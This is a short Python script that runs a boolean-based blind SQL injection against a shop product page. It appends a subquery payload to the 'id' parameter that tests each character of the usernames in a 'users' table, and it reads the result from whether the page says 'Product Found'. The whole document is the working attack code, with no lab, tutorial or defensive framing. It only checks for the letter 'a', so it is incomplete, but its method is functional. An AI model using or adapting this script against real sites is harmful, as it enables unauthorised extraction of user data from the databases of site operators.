import requests

url = 'http://shop.example.com/product?id=123'
for i in range(1, 11):
    for j in range(1, 21):
        payload = f' AND (SELECT ASCII(SUBSTRING(username,{j},1)) FROM users LIMIT 1 OFFSET {i-1}) = 97--'
        response = requests.get(url + payload)
        if 'Product Found' in response.text:
            print(f'User {i} character {j} is a')
